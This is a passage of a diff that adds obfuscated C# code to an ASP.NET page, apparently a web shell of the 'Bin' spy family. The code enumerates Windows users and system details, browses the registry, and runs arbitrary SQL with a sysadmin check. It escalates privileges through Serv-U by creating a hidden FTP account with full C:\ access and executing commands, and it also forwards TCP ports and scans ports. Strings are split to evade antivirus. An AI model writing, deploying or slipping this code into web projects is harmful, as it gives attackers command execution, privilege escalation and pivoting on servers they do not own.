+PropertyValueCollection pvc=child.Properties[name];
+
+int c=pvc.Count;
+
+for(int i=0;i<c;i++)
+
+{
+
+if(name!="objectSid" && name!="Parameters" && name!="LoginHours")
+
+{
+
+string bg=OKM();
+
+TableRow tr=new TableRow();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+TableCell td=new TableCell();
+
+td.Text=name;
+
+tr.Controls.Add(td);
+
+TableCell td1=new TableCell();
+
+td1.Text=pvc[i].ToString();
+
+tr.Controls.Add(td1);
+
+VPa.Controls.Add(tr);
+
+}
+
+}
+
+}
+
+TableRow trn=new TableRow();
+
+for(int x=1;x<3;x++)
+
+{
+
+TableCell tdn=new TableCell();
+
+tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
+
+trn.Controls.Add(tdn);
+
+VPa.Controls.Add(trn);
+
+}
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public void iLVUT()
+
+{
+
+try
+
+{
+
+WICxe();
+
+xWVQ.Visible=true;
+
+Bin_H2_Title.InnerText="User Information >>";
+
+DataTable user=cCf("Win32_UserAccount");
+
+for(int i=0;i<user.Rows.Count;i++)
+
+{
+
+for(int j=0;j<user.Columns.Count;j++)
+
+{
+
+string bg=OKM();
+
+TableRow tr=new TableRow();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+TableCell td=new TableCell();
+
+td.Text=user.Columns[j].ToString();
+
+tr.Controls.Add(td);
+
+TableCell td1=new TableCell();
+
+td1.Text=user.Rows[i][j].ToString();
+
+tr.Controls.Add(td1);
+
+VPa.Controls.Add(tr);
+
+}
+
+TableRow trn=new TableRow();
+
+for(int x=1;x<3;x++)
+
+{
+
+TableCell tdn=new TableCell();
+
+tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
+
+trn.Controls.Add(tdn);
+
+VPa.Controls.Add(trn);
+
+}
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+PLd();
+
+}
+
+}
+
+public void pDVM()
+
+{
+
+try
+
+{
+
+RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
+
+string IKjwH=DdmPl(EeZ,"PortNumber");
+
+RegistryKey izN=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
+
+int cpu=izN.SubKeyCount;
+
+RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
+
+string NPPZ=DdmPl(mQII,"ProcessorNameString");
+
+WICxe();
+
+ghaB.Visible=true;
+
+Bin_H2_Title.InnerText="System Information >>";
+
+Bin_H2_Mac.InnerText="MAC Information >>";
+
+Bin_H2_Driver.InnerText="Driver Information >>";
+
+StringBuilder yEwc=new StringBuilder();
+
+StringBuilder hwJeS=new StringBuilder();
+
+StringBuilder jXkaE=new StringBuilder();
+
+yEwc.Append("<li><u>Server Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
+
+yEwc.Append("<li><u>Server Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
+
+yEwc.Append("<li><u>Terminal Port : </u>"+IKjwH+"</li>");
+
+yEwc.Append("<li><u>Server OS : </u>"+Environment.OSVersion+"</li>");
+
+yEwc.Append("<li><u>Server Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
+
+yEwc.Append("<li><u>Server UserName : </u>"+Environment.UserName+"</li>");
+
+yEwc.Append("<li><u>Server Time : </u>"+System.DateTime.Now.ToString()+"</li>");
+
+yEwc.Append("<li><u>Server TimeZone : </u>"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"</li>");
+
+DataTable BIOS=cCf("Win32_BIOS");
+
+yEwc.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
+
+yEwc.Append("<li><u>CPU Count : </u>"+cpu.ToString()+"</li>");
+
+yEwc.Append("<li><u>CPU Version : </u>"+NPPZ+"</li>");
+
+DataTable upM=cCf("Win32_PhysicalMemory");
+
+Int64 oZnZV=0;
+
+for(int i=0;i<upM.Rows.Count;i++)
+
+{
+
+oZnZV+=Int64.Parse(upM.Rows[0]["Capacity"].ToString());
+
+}
+
+yEwc.Append("<li><u>Server upM : </u>"+mTG(oZnZV)+"</li>");
+
+DataTable dOza=cCf("Win32_NetworkAdapterConfiguration");
+
+for(int i=0;i<dOza.Rows.Count;i++)
+
+{
+
+hwJeS.Append("<li><u>Server MAC"+i+" : </u>"+dOza.Rows[i]["Caption"]+"</li>");
+
+if(dOza.Rows[i]["MACAddress"]!=string.Empty)
+
+{
+
+hwJeS.Append("<li style=\"list-style:none;\"><u>Address : </u>"+dOza.Rows[i]["MACAddress"]+"</li>");
+
+}
+
+}
+
+DataTable Driver=cCf("Win32_SystemDriver");
+
+for (int i=0; i<Driver.Rows.Count; i++)
+
+{
+
+jXkaE.Append("<li><u class='u1'>Server Driver"+i+" : </u><u class='u2'>"+Driver.Rows[i]["Caption"]+"</u> ");
+
+if (Driver.Rows[i]["PathName"]!=string.Empty)
+
+{
+
+jXkaE.Append("Path : "+Driver.Rows[i]["PathName"]);
+
+}
+
+else
+
+{
+
+jXkaE.Append("No path information");
+
+}
+
+jXkaE.Append("</li>");
+
+}
+
+Bin_Ul_Sys.InnerHtml=yEwc.ToString();
+
+Bin_Ul_NetConfig.InnerHtml=hwJeS.ToString();
+
+Bin_Ul_Driver.InnerHtml=jXkaE.ToString();
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public void ADCpk()
+
+{
+
+WICxe();
+
+APl.Visible=true;
+
+Bin_H2_Title.InnerText="Serv-U Exec >>";
+
+}
+
+public void lDODR()
+
+{
+
+string JGGg=string.Empty;
+
+string user=dNohJ.Value;
+
+string pass=NMd.Value;
+
+int port=Int32.Parse(HlQl.Value);
+
+string cmd=mHbjB.Value;
+
+string CRtK="user "+user+"\r\n";
+
+string jnNG="pass "+pass+"\r\n";
+
+string site="SITE MAINTENANCE\r\n";
+
+string mtoJb="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
+
+string sutI="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
+
+string iVDT="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
+
+string zexn="QUIT\r\n";
+
+UHlA.Visible=true;
+
+try
+
+{
+
+tcp.Connect("127.0.0.1",port);
+
+tcp.ReceiveBufferSize=1024;
+
+NS=tcp.GetStream();
+
+Rev(NS);
+
+ZJiM(NS,CRtK);
+
+Rev(NS);
+
+ZJiM(NS,jnNG);
+
+Rev(NS);
+
+ZJiM(NS,site);
+
+Rev(NS);
+
+ZJiM(NS,mtoJb);
+
+Rev(NS);
+
+ZJiM(NS,sutI);
+
+Rev(NS);
+
+ZJiM(NS,iVDT);
+
+Rev(NS);
+
+Bin_Td_Res.InnerHtml+="<font color=\"green\"><b>Exec Cmd.................\r\n</b></font>";
+
+zvxm.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);
+
+NS1=zvxm.GetStream();
+
+Rev(NS1);
+
+ZJiM(NS1,"user bin\r\n");
+
+Rev(NS1);
+
+ZJiM(NS1,"pass binftp\r\n");
+
+Rev(NS1);
+
+ZJiM(NS1,"site exec "+cmd+"\r\n");
+
+Rev(NS1);
+
+ZJiM(NS1,"quit\r\n");
+
+Rev(NS1);
+
+zvxm.Close();
+
+ZJiM(NS,mtoJb);
+
+Rev(NS);
+
+tcp.Close();
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+protected void Rev(NetworkStream instream)
+
+{
+
+string FTBtf=string.Empty;
+
+if(instream.CanRead)
+
+{
+
+byte[] uPZ=new byte[1024];
+
+do
+
+{
+
+System.Threading.Thread.Sleep(50);
+
+int len=instream.Read(uPZ,0,uPZ.Length);
+
+FTBtf+=Encoding.Default.GetString(uPZ,0,len);
+
+}
+
+while(instream.DataAvailable);
+
+}
+
+Bin_Td_Res.InnerHtml+="<font color=red>"+FTBtf.Replace("\0","")+"</font>";
+
+}
+
+protected void ZJiM(NetworkStream instream,string Sendstr)
+
+{
+
+if(instream.CanWrite)
+
+{
+
+byte[] uPZ=Encoding.Default.GetBytes(Sendstr);
+
+instream.Write(uPZ,0,uPZ.Length);
+
+}
+
+Bin_Td_Res.InnerHtml+="<font color=blue>"+Sendstr+"</font>";
+
+}
+
+public void xFhz()
+
+{
+
+WICxe();
+
+kkHN.Visible=true;
+
+Bin_H2_Title.InnerText="RegShell >>";
+
+string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
+
+vyX.Text="";
+
+foreach(string rootkey in txc.Split('|'))
+
+{
+
+vyX.Text+="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\">"+rootkey+"</a> | ";
+
+}
+
+lFAvw();
+
+}
+
+protected void lFAvw()
+
+{
+
+qPdI.Text="";
+
+string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
+
+TableRow tr;
+
+TableCell tc;
+
+foreach(string rootkey in txc.Split('|'))
+
+{
+
+tr=new TableRow();
+
+tc=new TableCell();
+
+string bg=OKM();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tc.Width=Unit.Parse("40%");
+
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\">"+rootkey+"</a>";
+
+tr.Cells.Add(tc);
+
+tc=new TableCell();
+
+tc.Width=Unit.Parse("60%");
+
+tc.Text="&lt;RootKey&gt;";
+
+tr.Cells.Add(tc);
+
+pLWD.Rows.Add(tr);
+
+}
+
+}
+
+protected void tpRQ(string Reg_Path)
+
+{
+
+if(!Reg_Path.EndsWith("\\"))
+
+{
+
+Reg_Path=Reg_Path+"\\";
+
+}
+
+qPdI.Text=Reg_Path;
+
+string cJG=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
+
+cJG=Regex.Replace(cJG,@"\\+","\\");
+
+TableRow tr=new TableRow();
+
+TableCell tc=new TableCell();
+
+string bg=OKM();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(cJG)+"')\">Parent Key</a>";
+
+tc.Attributes["colspan"]="2" ;
+
+tr.Cells.Add(tc);
+
+pLWD.Rows.Add(tr);
+
+try
+
+{
+
+string subpath;
+
+string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
+
+RegistryKey rk=null;
+
+RegistryKey sk;
+
+if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
+
+{
+
+rk=Registry.LocalMachine;
+
+}
+
+else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
+
+{
+
+rk=Registry.ClassesRoot;
+
+}
+
+else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))
+
+{
+
+rk=Registry.CurrentUser;
+
+}
+
+else if(Reg_Path.StartsWith("HKEY_USERS"))
+
+{
+
+rk=Registry.Users;
+
+}
+
+else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
+
+{
+
+rk=Registry.CurrentConfig;
+
+}
+
+if(kDgkX.Length>1)
+
+{
+
+sk=rk.OpenSubKey(kDgkX);
+
+}
+
+else
+
+{
+
+sk=rk;
+
+}
+
+foreach(string innerSubKey in sk.GetSubKeyNames())
+
+{
+
+tr=new TableRow();
+
+tc=new TableCell();
+
+bg=OKM();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tc.Width=Unit.Parse("40%");
+
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(Reg_Path+innerSubKey)+"')\">"+innerSubKey+"</a>";
+
+tr.Cells.Add(tc);
+
+tc=new TableCell();
+
+tc.Width=Unit.Parse("60%");
+
+tc.Text="&lt;SubKey&gt;";
+
+tr.Cells.Add(tc);
+
+pLWD.Rows.Add(tr);
+
+}
+
+TableRow cKVA=new TableRow();
+
+cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
+
+cKVA.Attributes["bgcolor"]="#dddddd";
+
+TableCell JlmW=new TableCell();
+
+JlmW.Attributes["colspan"]="2" ;
+
+JlmW.Attributes["height"]="5";
+
+cKVA.Cells.Add(JlmW);
+
+pLWD.Rows.Add(cKVA);
+
+foreach(string strValueName in sk.GetValueNames())
+
+{
+
+tr=new TableRow();
+
+tc=new TableCell();
+
+bg=OKM();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tc.Width=Unit.Parse("40%");
+
+tc.Text=strValueName;
+
+tr.Cells.Add(tc);
+
+tc=new TableCell();
+
+tc.Width=Unit.Parse("60%");
+
+tc.Text=DdmPl(sk,strValueName);
+
+tr.Cells.Add(tc);
+
+pLWD.Rows.Add(tr);
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public string DdmPl(RegistryKey sk,string strValueName)
+
+{
+
+object uPZ;
+
+string RaTGr="";
+
+try
+
+{
+
+uPZ=sk.GetValue(strValueName,"NULL");
+
+if(uPZ.GetType()==typeof(byte[]))
+
+{
+
+foreach(byte tmpbyte in(byte[])uPZ)
+
+{
+
+if((int)tmpbyte<16)
+
+{
+
+RaTGr+="0";
+
+}
+
+RaTGr+=tmpbyte.ToString("X");
+
+}
+
+}
+
+else if(uPZ.GetType()==typeof(string[]))
+
+{
+
+foreach(string tmpstr in(string[])uPZ)
+
+{
+
+RaTGr+=tmpstr;
+
+}
+
+}
+
+else
+
+{
+
+RaTGr=uPZ.ToString();
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+return RaTGr;
+
+}
+
+public void vNCHZ()
+
+{
+
+WICxe();
+
+YwLB.Visible=true;
+
+Bin_H2_Title.InnerText="PortScan >>";
+
+}
+
+public void rAhe()
+
+{
+
+WICxe();
+
+iDgmL.Visible=true;
+
+dQIIF.Visible=false;
+
+Bin_H2_Title.InnerText="DataBase >>";
+
+}
+
+protected void OUj()
+
+{
+
+if(Dtdr.State==ConnectionState.Closed)
+
+{
+
+try
+
+{
+
+Dtdr.ConnectionString=MasR.Text;
+
+Kkvb.Connection=Dtdr;
+
+Dtdr.Open();
+
+}
+
+catch(Exception Error)
+
+{
+
+xseuB(Error.Message);
+
+}
+
+}
+
+}
+
+protected void fUzE()
+
+{
+
+if(Dtdr.State==ConnectionState.Open)
+
+Dtdr.Close();
+
+Dtdr.Dispose();
+
+Kkvb.Dispose();
+
+}
+
+public DataTable CYUe(string sqlstr)
+
+{
+
+OleDbDataAdapter da=new OleDbDataAdapter();
+
+DataTable Dstog=new DataTable();
+
+try
+
+{
+
+OUj();
+
+Kkvb.CommandType=CommandType.Text;
+
+Kkvb.CommandText=sqlstr;
+
+da.SelectCommand=Kkvb;
+
+da.Fill(Dstog);
+
+}
+
+catch(Exception)
+
+{
+
+}
+
+finally
+
+{
+
+fUzE();
+
+}
+
+return Dstog;
+
+}
+
+public DataTable[] Bin_Data(string query)
+
+{
+
+ArrayList list=new ArrayList();
+
+try
+
+{
+
+string str;
+
+OUj();
+
+query=query+"\r\n";
+
+MatchCollection gcod=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);
+
+int EmRX=0;
+
+for(int i=0;i<gcod.Count;i++)
+
+{
+
+Match FJD=gcod[i];
+
+str=query.Substring(EmRX,FJD.Index-EmRX);
+
+if(str.Trim().Length>0)
+
+{
+
+OleDbDataAdapter FgzeQ=new OleDbDataAdapter();
+
+Kkvb.CommandType=CommandType.Text;
+
+Kkvb.CommandText=str.Trim();
+
+FgzeQ.SelectCommand=Kkvb;
+
+DataSet cDPp=new DataSet();
+
+FgzeQ.Fill(cDPp);
+
+for(int j=0;j<cDPp.Tables.Count;j++)
+
+{
+
+list.Add(cDPp.Tables[j]);
+
+}
+
+}
+
+EmRX=FJD.Index+3;
+
+}
+
+str=query.Substring(EmRX,query.Length-EmRX);
+
+if(str.Trim().Length>0)
+
+{
+
+OleDbDataAdapter VwB=new OleDbDataAdapter();
+
+Kkvb.CommandType=CommandType.Text;
+
+Kkvb.CommandText=str.Trim();
+
+VwB.SelectCommand=Kkvb;
+
+DataSet arG=new DataSet();
+
+VwB.Fill(arG);
+
+for(int k=0;k<arG.Tables.Count;k++)
+
+{
+
+list.Add(arG.Tables[k]);
+
+}
+
+}
+
+}
+
+catch(SqlException e)
+
+{
+
+xseuB(e.Message);
+
+rom.Visible=false;
+
+}
+
+return(DataTable[])list.ToArray(typeof(DataTable));
+
+}
+
+public void JIAKU(string instr)
+
+{
+
+try
+
+{
+
+OUj();
+
+Kkvb.CommandType=CommandType.Text;
+
+Kkvb.CommandText=instr;
+
+Kkvb.ExecuteNonQuery();
+
+}
+
+catch(Exception e)
+
+{
+
+xseuB(e.Message);
+
+}
+
+}
+
+public void dwgT()
+
+{
+
+try
+
+{
+
+OUj();
+
+if(WYmo.SelectedItem.Text=="MSSQL")
+
+{
+
+if(Pvf.SelectedItem.Value!="")
+
+{
+
+Dtdr.ChangeDatabase(Pvf.SelectedItem.Value.ToString());
+
+}
+
+}
+
+DataTable[] jxF=null;
+
+jxF=Bin_Data(jHIy.InnerText);
+
+if(jxF!=null && jxF.Length>0)
+
+{
+
+for(int j=0;j<jxF.Length;j++)
+
+{
+
+rom.PreRender+=new EventHandler(lRavM);
+
+rom.DataSource=jxF[j];
+
+rom.DataBind();
+
+for(int i=0;i<rom.Items.Count;i++)
+
+{
+
+string bg=OKM();
+
+rom.Items[i].CssClass=bg;
+
+rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
+
+rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
+
+}
+
+}
+
+}
+
+else
+
+{
+
+rom.DataSource=null;
+
+rom.DataBind();
+
+}
+
+rom.Visible=true;
+
+}
+
+catch(Exception e)
+
+{
+
+xseuB(e.Message);
+
+rom.Visible=false;
+
+}
+
+}
+
+public void xTZY()
+
+{
+
+try
+
+{
+
+if(WYmo.SelectedItem.Text=="MSSQL")
+
+{
+
+if(Pvf.SelectedItem.Value=="")
+
+{
+
+rom.DataSource=null;
+
+rom.DataBind();
+
+return;
+
+}
+
+}
+
+OUj();
+
+DataTable zKvOw=new DataTable();
+
+DataTable jxF=new DataTable();
+
+DataTable baVJV=new DataTable();
+
+if(WYmo.SelectedItem.Text=="MSSQL" && Pvf.SelectedItem.Value!="")
+
+{
+
+Dtdr.ChangeDatabase(Pvf.SelectedItem.Text);
+
+}
+
+zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });
+
+jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });
+
+foreach(DataRow dr in zKvOw.Rows)
+
+{
+
+jxF.ImportRow(dr);
+
+}
+
+jxF.Columns.Remove("TABLE_CATALOG");jxF.Columns.Remove("TABLE_SCHEMA");jxF.Columns.Remove("DESCRIPTION");jxF.Columns.Remove("TABLE_PROPID");
+
+rom.PreRender+=new EventHandler(lRavM);
+
+rom.DataSource=jxF;
+
+rom.DataBind();
+
+for(int i=0;i<rom.Items.Count;i++)
+
+{
+
+string bg=OKM();
+
+rom.Items[i].CssClass=bg;
+
+rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
+
+rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
+
+}
+
+rom.Visible=true;
+
+}
+
+catch(Exception e)
+
+{
+
+xseuB(e.Message);
+
+rom.Visible=false;
+
+}
+
+}
+
+private void lRavM(object sender,EventArgs e)
+
+{
+
+DataGrid d=(DataGrid)sender;
+
+foreach(DataGridItem item in d.Items)
+
+{
+
+foreach(TableCell t in item.Cells)
+
+{
+
+t.Text=t.Text.Replace("<","&lt;").Replace(">","&gt;");
+
+}
+
+}
+
+}
+
+public void vCf()
+
+{
+
+dQIIF.Visible=true;
+
+try
+
+{
+
+jHIy.InnerHtml=string.Empty;
+
+if(WYmo.SelectedItem.Text=="MSSQL")
+
+{
+
+rom.Visible=false;
+
+uXevN.Visible=true;
+
+irTU.Visible=true;
+
+OUj();
+
+DataTable ver=CYUe(@"SELECT @@VERSION");
+
+DataTable dbs=CYUe(@"SELECT name FROM master.dbo.sysdatabases");
+
+DataTable cdb=CYUe(@"SELECT DB_NAME()");
+
+DataTable rol=CYUe(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
+
+DataTable YKrm=CYUe(@"SELECT IS_MEMBER('db_owner')");
+
+string jHlh=ver.Rows[0][0].ToString();
+
+string dbo=string.Empty;
+
+if(YKrm.Rows[0][0].ToString()=="1")
+
+{
+
+dbo="db_owner";
+
+}
+
+else
+
+{
+
+dbo="public";
+
+}
+
+if(rol.Rows[0][0].ToString()=="1")
+
+{
+
+dbo="<font color=blue>sa</font>";
+
+}
+
+string db_name=string.Empty;
+
+foreach(ListItem item in FGEy.Items)
+
+{
+
+ if(item.Selected=true)
+
+ {
+
+ item.Selected=false;
+
+ }
+
+}
+
+Pvf.Items.Clear();
+
+Pvf.Items.Add("-- Select a DataBase --");
+
+Pvf.Items[0].Value="";
+
+for(int i=0;i<dbs.Rows.Count;i++)
+
+{
+
+db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),"<font color=blue>"+cdb.Rows[0][0].ToString()+"</font>")+"&nbsp;|&nbsp;";
+
+Pvf.Items.Add(dbs.Rows[i][0].ToString());
+
+}
+
+irTU.InnerHtml="<p><font color=red>MSSQL Version</font> : <i><b>"+jHlh+"</b></i></p><p><font color=red>SrvRoleMember</font> : <i><b>"+dbo+"</b></i></p>";
+
+}
+
+else
+
+{
+
+uXevN.Visible=false;
+
+irTU.Visible=false;
+
+xTZY();
+
+}
+
+}
+
+catch(Exception e)
+
+{
+
+dQIIF.Visible=false;
+
+}
+
+}
+
+public void MHLv()
+
+{
+
+WICxe();
+
+hOWTm.Visible=true;
+
+string miansha1="P"+"o"+"r"+"t"+"M"+"a"+"p"+" "+">"+">";
+
+Bin_H2_Title.InnerText=miansha1;
+
+}
+
+public class PortForward
+
+{
+
+public string Localaddress;
+
+public int LocalPort;
+
+public string RemoteAddress;
+
+public int RemotePort;
+
+string type;
+
+Socket ltcpClient;
+
+Socket rtcpClient;
+
+Socket server;
+
+byte[] DPrPL=new byte[2048];
+
+byte[] wvZv=new byte[2048];
+
+public struct session
+
+{
+
+public Socket rdel;
+
+public Socket ldel;
+
+public int llen;
+
+public int rlen;
+
+}
+
+public static IPEndPoint mtJ(string host,int port)
+
+{
+
+IPEndPoint iep=null;
+
+IPHostEntry aGN=Dns.Resolve(host);
+
+IPAddress rmt=aGN.AddressList[0];
+
+iep=new IPEndPoint(rmt,port);
+
+return iep;
+
+}
+
+public void Start(string Rip,int Rport,string lip,int lport)
+
+{
+
+try
+
+{
+
+LocalPort=lport;
+
+RemoteAddress=Rip;
+
+RemotePort=Rport;
+
+Localaddress=lip;
+
+rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+
+ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+
+rtcpClient.BeginConnect(mtJ(RemoteAddress,RemotePort),new AsyncCallback(iiGFO),rtcpClient);
+
+}
+
+catch (Exception ex) { }
+
+}
+
+protected void iiGFO(IAsyncResult ar)
+
+{
+
+try
+
+{
+
+session RKXy=new session();
+
+RKXy.ldel=ltcpClient;
+
+RKXy.rdel=rtcpClient;
+
+ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),RKXy);
+
+}
+
+catch (Exception ex) { }
+
+}
+
+protected void VTp(IAsyncResult ar)
+
+{
+
+try
+
+{
+
+session RKXy=(session)ar.AsyncState;
+
+ltcpClient.EndConnect(ar);
+
+RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),RKXy);
+
+RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),RKXy);
+
+}
+
+catch (Exception ex) { }
+
+}
+
+private void LFYM(IAsyncResult ar)
+
+{
+
+try
+
+{
+
+session RKXy=(session)ar.AsyncState;
+
+int Ret=RKXy.rdel.EndReceive(ar);
+
+if (Ret>0)
+
+ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);
+
+else lyTOK();
+
+}
+
+catch (Exception ex) { }
+
+}
+
+private void JTcp(IAsyncResult ar)
+
+{
+
+try
+
+{
+
+session RKXy=(session)ar.AsyncState;
+
+RKXy.ldel.EndSend(ar);
+
+RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),RKXy);
+
+}
+
+catch (Exception ex) { }
+
+}
+
+private void xPS(IAsyncResult ar)
+
+{
+
+try
+
+{
+
+session RKXy=(session)ar.AsyncState;
+
+int Ret=RKXy.ldel.EndReceive(ar);
+
+if (Ret>0)
+
+RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);
+
+else lyTOK();
+
+}
+
+catch (Exception ex) { }
+
+}
+
+private void IZU(IAsyncResult ar)
+
+{
+
+try
+
+{
+
+session RKXy=(session)ar.AsyncState;
+
+RKXy.rdel.EndSend(ar);
+
+RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),RKXy);
+
+}
+
+catch (Exception ex) { }
+
+}
+
+public void lyTOK()
+
+{
+
+try
+
+{
+
+if (ltcpClient!=null)
+
+{
+
+ltcpClient.Close();
+
+}
+
+if (rtcpClient!=null)
+
+rtcpClient.Close();
+
+}
+
+catch (Exception ex) { }
+
+}
+
+}
+
+protected void vuou()
+
+{
+
+PortForward gYP=new PortForward();
+
+gYP.lyTOK();
+
+}
+
+protected void ruQO()
+
+{
+
+PortForward gYP=new PortForward();
+
+gYP.Start(llH.Value,int.Parse(ZHS.Value),eEpm.Value,int.Parse(iXdh.Value));
+
+}
+
+public string mRDl(string instr)
+
+{
+
+string tmp=null;
+
+try
+
+{
+
+tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();
+
+}
+
+catch(Exception e)
+
+{
+
+}
+
+return tmp;
+
+}
+
+public void VikG()
+
+{
+
+string[] OTV=lOmX.Text.ToString().Split(',');
+
+for(int i=0;i<OTV.Length;i++)
+
+{
+
+IVc.Add(new ScanPort(mRDl(MdR.Text.ToString()),Int32.Parse(OTV[i])));
+
+}
+
+try
+
+{
+
+Thread[] kbXY=new Thread[IVc.Count];
+
+int sdO=0;
+
+for(sdO=0;sdO<IVc.Count;sdO++)
+
+{
+
+kbXY[sdO]=new Thread(new ThreadStart(((ScanPort)IVc[sdO]).Scan));
+
+kbXY[sdO].Start();
+
+}
+
+for(sdO=0;sdO<kbXY.Length;sdO++)
+
+kbXY[sdO].Join();
+
+}
+
+catch
+
+{
+
+}
+
+}
+
+public class ScanPort
+
+{
+
+private string _ip="";
+
+private int jTdO=0;
+
+private TimeSpan _timeSpent;
+
+private string QGcH="Not scanned";
+
+public string ip
+
+{
+
+get { return _ip;}
+
+}
+
+public int port
+
+{
+
+get { return jTdO;}
+
+}
+
+public string status
+
+{
+
+get { return QGcH;}
+
+}
+
+public TimeSpan timeSpent
+
+{
+
+get { return _timeSpent;}
+
+}
+
+public ScanPort(string ip,int port)
+
+{
+
+_ip=ip;
+
+jTdO=port;
+
+}
+
+public void Scan()
+
+{
+
+TcpClient iYap=new TcpClient();
+
+DateTime qYZT=DateTime.Now;
+
+try
+
+{
+
+iYap.Connect(_ip,jTdO);
+
+iYap.Close();
+
+QGcH="<font color=green><b>Open</b></font>";
+
+}
+
+catch
+
+{
+
+QGcH="<font color=red><b>Close</b></font>";
+
+}
+
+_timeSpent=DateTime.Now.Subtract(qYZT);
+
